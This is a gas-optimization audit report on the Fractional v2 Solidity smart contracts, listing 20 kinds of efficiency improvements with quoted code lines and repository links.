## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | Check the first bit of the number rather than using the modulo operator, to save gas | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 2 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 70 | | [G&#x2011;04] | Structs can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 15 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 2 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 27 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | `internal` functions only called once can be inlined to save gas | 3 | | [G&#x2011;10] | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | [G&#x2011;11] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 2 | | [G&#x2011;12] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 2 | | [G&#x2011;13] | Optimize names to save gas | 28 | | [G&#x2011;14] | Using `bool`s for storage incurs overhead | 1 | | [G&#x2011;15] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 3 | | [G&#x2011;16] | Using `private` rather than `public` for constants, saves gas | 5 | | [G&#x2011;17] | Division by two should use bit shifting | 3 | | [G&#x2011;18] | Empty blocks should be removed or emit something | 3 | | [G&#x2011;19] | Use custom errors rather than `revert()`/`require()` strings to save gas | 5 | | [G&#x2011;20] | Functions guaranteed to revert when called by normal users can be marked `payable` | 6 |  Total: 188 instances over 20 issues   ## Gas Optimizations  ### [G&#x2011;01]  Check the first bit of the number rather than using the modulo operator, to save gas Do the same sort of bit check as is on line 135  *There is 1 instance of this issue:* ```solidity File: src/utils/MerkleBase.sol  91:                  if (_node % 2 == 1) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L91  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There are 2 instances of this issue:* ```solidity File: src/FERC1155.sol  23        mapping(address => mapping(address => mapping(uint256 => bool))) 24            public isApproved; 25        /// @notice Mapping of metadata contracts for token ID types => metadata address 26        mapping(uint256 => address) public metadata; 27        /// @notice Mapping to track account nonces for metadata txs owner => nonces 28        mapping(address => uint256) public nonces; 29        /// @notice Mapping to track total supply for token ID types => totalSupply 30        mapping(uint256 => uint256) public totalSupply; 31        /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress 32        mapping(uint256 => address) private royaltyAddress; 33        /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent 34:       mapping(uint256 => uint256) private royaltyPercent;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L23-L34  ```solidity File: src/modules/Migration.sol  45        mapping(address => mapping(uint256 => Proposal)) public migrationInfo; 46        /// @notice Mapping of a proposal ID to a user's ether contribution 47        mapping(uint256 => mapping(address => uint256)) private userProposalEth; 48        /// @notice Mapping of a proposal ID to a user's fractions contribution 49        mapping(uint256 => mapping(address => uint256)) 50:           private userProposalFractions;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L45-L50  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 70 instances of this issue:* ```solidity File: src/modules/Buyout.sol  /// @audit registry 47:           registry = _registry;  /// @audit registry 61:           (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 71:           uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 114:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 151:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 186:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 210:                  IVaultRegistry(registry).totalSupply(_vault) >  /// @audit registry 246:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 267:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 280:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 288:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 319:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 351:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 387:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 424:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit supply 48:           supply = _supply;  /// @audit supply 219:              IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 264:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 294:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 476:              supply,  /// @audit supply 477:              ISupply(supply).burn.selector  /// @audit transfer 49:           transfer = _transfer;  /// @audit transfer 334:          IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);  /// @audit transfer 366:          IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);  /// @audit transfer 403:          IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);  /// @audit transfer 441:              transfer,  /// @audit transfer 482:              transfer,  /// @audit transfer 483:              ITransfer(transfer).ERC20Transfer.selector  /// @audit transfer 488:              transfer,  /// @audit transfer 489:              ITransfer(transfer).ERC721TransferFrom.selector  /// @audit transfer 494:              transfer,  /// @audit transfer 495:              ITransfer(transfer).ERC1155TransferFrom.selector  /// @audit transfer 500:              transfer,  /// @audit transfer 501:              ITransfer(transfer).ERC1155BatchTransferFrom.selector  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L47  ```solidity File: src/modules/Migration.sol  /// @audit buyout 58:           buyout = payable(_buyout);  /// @audit buyout 84:           (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 116:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 148:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 189:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 208:              IFERC1155(token).setApprovalFor(address(buyout), id, true);  /// @audit buyout 210:              IBuyout(buyout).start{value: proposal.totalEth}(_vault);  /// @audit buyout 225:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 263:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 301:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 343:          IBuyout(buyout).withdrawERC20(  /// @audit buyout 367:          IBuyout(buyout).withdrawERC721(  /// @audit buyout 393:          IBuyout(buyout).withdrawERC1155(  /// @audit buyout 420:          IBuyout(buyout).batchWithdrawERC1155(  /// @audit buyout 438:          (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(  /// @audit buyout 447:          (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(  /// @audit registry 59:           registry = _registry;  /// @audit registry 81:           (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 95:           proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(  /// @audit registry 111:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 143:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 184:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 200:              IVaultRegistry(registry).totalSupply(_vault),  /// @audit registry 235:          address newVault = IVaultRegistry(registry).create(  /// @audit registry 296:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 435:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 467:          (address token, uint256 newFractionId) = IVaultRegistry(registry)  /// @audit registry 470:          uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L58  ```solidity File: src/modules/Minter.sol  /// @audit supply 18:           supply = _supply;  /// @audit supply 40:               supply,  /// @audit supply 60:           IVault(payable(_vault)).execute(supply, data, _mintProof);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L18  ```solidity File: src/modules/protoforms/BaseVault.sol  /// @audit registry 25:           registry = _registry;  /// @audit registry 43:           vault = IVaultRegistry(registry).create(  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L25  ```solidity File: src/VaultFactory.sol  /// @audit implementation 21:           implementation = address(new Vault());  /// @audit implementation 39:           (uint256 creationPtr, uint256 creationSize) = implementation  /// @audit implementation 69:           vault = implementation.clone(salt, data);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L21  ### [G&#x2011;04]  Structs can be packed into fewer storage slots Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings  *There is 1 instance of this issue:* ```solidity File: src/interfaces/IMigration.sol  /// @audit Variable ordering with 10 slots instead of the current 11: ///           uint256(32):startTime, uint256(32):targetPrice, uint256(32):totalEth, uint256(32):totalFractions, address[](32):modules, address[](32):plugins, bytes4[](32):selectors, uint256(32):oldFractionSupply, uint256(32):newFractionSupply, address(20):newVault, bool(1):isCommited, bool(1):fractionsMigrated 8     struct Proposal { 9         // Start time of the migration proposal 10        uint256 startTime; 11        // Target buyout price for the migration 12        uint256 targetPrice; 13        // Total ether contributed to the migration 14        uint256 totalEth; 15        // Total fractions contributed to the migration 16        uint256 totalFractions; 17        // Module contract addresses proposed for the migration 18        address[] modules; 19        // Plugin contract addresses proposed for the migration 20        address[] plugins; 21        // Function selectors for the proposed plugins 22        bytes4[] selectors; 23        // Address for the new vault to migrate to (if buyout is succesful) 24        address newVault; 25        // Boolean status to check if the propoal is active 26        bool isCommited; 27        // Old fraction supply for a given vault 28        uint256 oldFractionSupply; 29        // New fraction supply for a given vault that has succesfully migrated 30        uint256 newFractionSupply; 31        // Boolean status to check that the fractions have already been migrated 32        bool fractionsMigrated; 33:   }  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMigration.sol#L8-L33  ### [G&#x2011;05]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved  *There are 15 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _uri 68:       function emitSetURI(uint256 _id, string memory _uri) external {  /// @audit _data 79        function mint( 80            address _to, 81            uint256 _id, 82            uint256 _amount, 83            bytes memory _data 84:       ) external onlyRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68  ```solidity File: src/utils/MerkleBase.sol  /// @audit _proof 43        function verifyProof( 44            bytes32 _root, 45            bytes32[] memory _proof, 46            bytes32 _valueToProve 47:       ) public pure returns (bool) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ```solidity File: src/utils/Metadata.sol  /// @audit _uri 24:       function setURI(uint256 _id, string memory _uri) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24  ```solidity File: src/VaultRegistry.sol  /// @audit _plugins /// @audit _selectors 51        function create( 52            bytes32 _merkleRoot, 53            address[] memory _plugins, 54            bytes4[] memory _selectors 55:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 67        function createFor( 68            bytes32 _merkleRoot, 69            address _owner, 70            address[] memory _plugins, 71            bytes4[] memory _selectors 72:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 83        function createCollection( 84            bytes32 _merkleRoot, 85            address[] memory _plugins, 86            bytes4[] memory _selectors 87:       ) external returns (address vault, address token) {  /// @audit _plugins /// @audit _selectors 102       function createInCollection( 103           bytes32 _merkleRoot, 104           address _token, 105           address[] memory _plugins, 106           bytes4[] memory _selectors 107:      ) external returns (address vault) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L55  ```solidity File: src/Vault.sol  /// @audit _selectors /// @audit _plugins 73:       function install(bytes4[] memory _selectors, address[] memory _plugins)  /// @audit _selectors 101:      function uninstall(bytes4[] memory _selectors) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73  ### [G&#x2011;06]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 2 instances of this issue:* ```solidity File: src/VaultRegistry.sol  40:           VaultInfo memory info = vaultToToken[msg.sender];  118:          VaultInfo memory info = vaultToToken[msg.sender];  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L40  ### [G&#x2011;07]  State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 27 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _controller on line 303 305:              : controllerAddress = _controller;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L305  ```solidity File: src/modules/Buyout.sol  /// @audit registry on line 61 71:           uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry on line 186 210:                  IVaultRegistry(registry).totalSupply(_vault) >  /// @audit registry on line 246 267:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry on line 280 288:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit supply on line 476 477:              ISupply(supply).burn.selector  /// @audit transfer on line 482 483:              ITransfer(transfer).ERC20Transfer.selector  /// @audit transfer on line 483 488:              transfer,  /// @audit transfer on line 488 489:              ITransfer(transfer).ERC721TransferFrom.selector  /// @audit transfer on line 489 494:              transfer,  /// @audit transfer on line 494 495:              ITransfer(transfer).ERC1155TransferFrom.selector  /// @audit transfer on line 495 500:              transfer,  /// @audit transfer on line 500 501:              ITransfer(transfer).ERC1155BatchTransferFrom.selector  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L71  ```solidity File: src/modules/Migration.sol  /// @audit buyout on line 189 208:              IFERC1155(token).setApprovalFor(address(buyout), id, true);  /// @audit buyout on line 208 210:              IBuyout(buyout).start{value: proposal.totalEth}(_vault);  /// @audit buyout on line 438 447:          (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(  /// @audit registry on line 81 95:           proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(  /// @audit registry on line 184 200:              IVaultRegistry(registry).totalSupply(_vault),  /// @audit registry on line 435 467:          (address token, uint256 newFractionId) = IVaultRegistry(registry)  /// @audit registry on line 467 470:          uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L208  ```solidity File: src/Vault.sol  /// @audit owner on line 76 76:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 87 87:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 94 94:           if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 102 102:          if (owner != msg.sender) revert NotOwner(owner, msg.sender);  /// @audit owner on line 126 /// @audit owner on line 132 132:          if (owner_ != owner) revert OwnerChanged(owner_, owner);  /// @audit nonce on line 25 25:           if (nonce != 0) revert Initialized(owner, msg.sender, nonce);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L76  ### [G&#x2011;08]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/modules/Buyout.sol  /// @audit buyoutInfo[_vault] on line 297 297:          (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = (  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L297  ### [G&#x2011;09]  `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 3 instances of this issue:* ```solidity File: src/FERC1155.sol  324       function _computePermitStructHash( 325           address _owner, 326           address _operator, 327           uint256 _id, 328           bool _approved, 329           uint256 _deadline 330:      ) internal returns (bytes32) {  350       function _computePermitAllStructHash( 351           address _owner, 352           address _operator, 353           bool _approved, 354           uint256 _deadline 355:      ) internal returns (bytes32) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324-L330  ```solidity File: src/Vault.sol  142:      function _revertedWithReason(bytes memory _response) internal pure {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L142  ### [G&#x2011;10]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 8 instances of this issue:* ```solidity File: src/modules/Buyout.sol  454:          for (uint256 i; i < permissions.length; ) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454  ```solidity File: src/modules/protoforms/BaseVault.sol  64:           for (uint256 i = 0; i < _tokens.length; ) {  83:           for (uint256 i = 0; i < _tokens.length; ) {  107:              for (uint256 i = 0; i < _tokens.length; ++i) {  130:              for (uint256 i; i < _modules.length; ++i) {  132:                  for (uint256 j; j < leaves.length; ++j) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L64  ```solidity File: src/utils/MerkleBase.sol  51:               for (uint256 i = 0; i < _proof.length; ++i) {  110:              for (uint256 i; i < result.length; ++i) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51  ### [G&#x2011;11]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 2 instances of this issue:* ```solidity File: src/Vault.sol  78:           for (uint256 i = 0; i < length; i++) {  104:          for (uint256 i = 0; i < length; i++) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ### [G&#x2011;12]  `require()`/`revert()` strings longer than 32 bytes cost extra gas Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**  *There are 2 instances of this issue:* ```solidity File: src/utils/MerkleBase.sol  62:           require(_data.length > 1, "wont generate root for single leaf");  78:           require(_data.length > 1, "wont generate proof for single leaf");  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62  ### [G&#x2011;13]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 28 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit burn(), emitSetURI(), mint(), permit(), permitAll(), setApprovalFor(), setContractURI(), setMetadata(), setRoyalties(), transferController(), royaltyInfo(), controller(), INITIAL_CONTROLLER(), VAULT_REGISTRY() 13:   contract FERC1155 is Clone, ERC1155, IFERC1155 {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L13  ```solidity File: src/interfaces/IBaseVault.sol  /// @audit batchDepositERC20(), batchDepositERC721(), batchDepositERC1155(), deployVault(), registry() 8:    interface IBaseVault is IProtoform {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IBaseVault.sol#L8  ```solidity File: src/interfaces/IBuyout.sol  /// @audit PROPOSAL_PERIOD(), REJECTION_PERIOD(), batchWithdrawERC1155(), buyFractions(), buyoutInfo(), cash(), end(), getLeafNodes(), getPermissions(), redeem(), registry(), sellFractions(), start(), supply(), transfer(), withdrawERC20(), withdrawERC721(), withdrawERC1155() 31:   interface IBuyout is IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IBuyout.sol#L31  ```solidity File: src/interfaces/IFERC1155.sol  /// @audit INITIAL_CONTROLLER(), NAME(), VAULT_REGISTRY(), VERSION(), burn(), contractURI(), controller(), emitSetURI(), isApproved(), metadata(), mint(), permit(), permitAll(), royaltyInfo(), setApprovalFor(), setContractURI(), setMetadata(), setRoyalties(), totalSupply(), transferController() 5:    interface IFERC1155 {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IFERC1155.sol#L5  ```solidity File: src/interfaces/IMigration.sol  /// @audit PROPOSAL_PERIOD(), batchMigrateVaultERC1155(), buyout(), commit(), generateMerkleTree(), join(), leave(), migrateFractions(), migrateVaultERC20(), migrateVaultERC721(), migrationInfo(), nextId(), propose(), registry(), settleFractions(), settleVault(), withdrawContribution() 36:   interface IMigration {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMigration.sol#L36  ```solidity File: src/interfaces/IMinter.sol  /// @audit supply() 8:    interface IMinter is IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMinter.sol#L8  ```solidity File: src/interfaces/IModule.sol  /// @audit getLeafNodes(), getPermissions() 7:    interface IModule {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IModule.sol#L7  ```solidity File: src/interfaces/IProtoform.sol  /// @audit deployVault(), generateMerkleTree() 7:    interface IProtoform {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IProtoform.sol#L7  ```solidity File: src/interfaces/ISupply.sol  /// @audit mint(), burn() 5:    interface ISupply {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/ISupply.sol#L5  ```solidity File: src/interfaces/ITransfer.sol  /// @audit ERC20Transfer(), ERC721TransferFrom(), ERC1155TransferFrom(), ERC1155BatchTransferFrom() 5:    interface ITransfer {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/ITransfer.sol#L5  ```solidity File: src/interfaces/IVaultFactory.sol  /// @audit deploy(), deployFor(), getNextAddress(), getNextSeed(), implementation() 5:    interface IVaultFactory {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVaultFactory.sol#L5  ```solidity File: src/interfaces/IVaultRegistry.sol  /// @audit burn(), create(), createCollection(), createCollectionFor(), createFor(), createInCollection(), factory(), fNFT(), fNFTImplementation(), mint(), nextId(), totalSupply(), uri(), vaultToToken() 23:   interface IVaultRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVaultRegistry.sol#L23  ```solidity File: src/interfaces/IVault.sol  /// @audit execute(), init(), install(), merkleRoot(), methods(), nonce(), setMerkleRoot(), uninstall() 5:    interface IVault {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IVault.sol#L5  ```solidity File: src/modules/Buyout.sol  /// @audit start(), sellFractions(), buyFractions(), end(), cash(), redeem(), withdrawERC20(), withdrawERC721(), withdrawERC1155(), batchWithdrawERC1155(), getLeafNodes(), getPermissions() 27:   contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L27  ```solidity File: src/modules/Migration.sol  /// @audit propose(), join(), leave(), commit(), settleVault(), settleFractions(), withdrawContribution(), migrateVaultERC20(), migrateVaultERC721(), migrateVaultERC1155(), batchMigrateVaultERC1155(), migrateFractions(), generateMerkleTree() 28:   contract Migration is  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L28  ```solidity File: src/modules/Minter.sol  /// @audit getLeafNodes(), getPermissions() 12:   contract Minter is IMinter {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L12  ```solidity File: src/modules/protoforms/BaseVault.sol  /// @audit deployVault(), batchDepositERC20(), batchDepositERC721(), batchDepositERC1155(), generateMerkleTree() 17:   contract BaseVault is IBaseVault, MerkleBase, Minter, Multicall {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L17  ```solidity File: src/references/SupplyReference.sol  /// @audit mint(), burn() 10:   contract SupplyReference is ISupply {  ``` 